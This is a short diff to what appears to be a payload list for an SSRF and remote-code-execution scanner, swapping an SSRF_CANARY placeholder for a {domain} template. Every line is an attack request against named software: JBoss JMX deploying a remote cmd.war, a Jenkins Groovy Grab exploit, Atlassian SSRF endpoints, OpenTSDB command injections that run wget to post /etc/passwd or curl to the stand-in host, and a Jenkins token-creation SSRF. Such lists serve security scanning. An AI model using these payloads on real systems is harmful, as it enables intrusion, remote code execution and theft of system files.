@@ -1,9 +1,9 @@
-jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
-org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
-plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
-plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
-proxy.stream?origin=http://SSRF_CANARY/
-q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
-q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
-rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
-securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
+jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://{domain}/utils/cmd.war
+org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://{domain}/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
+plugins/servlet/gadgets/makeRequest?url=https://{domain}:443@{goodDomain}
+plugins/servlet/oauth/users/icon-uri?consumerUri=http://{domain}
+proxy.stream?origin=http://{domain}/
+q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20{domain}')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
+q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20{domain}%60&style=linespoint&png
+rest/sharelinks/1.0/link?url=https://{domain}/
+securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{domain}/%23&login=orange&password=tsai
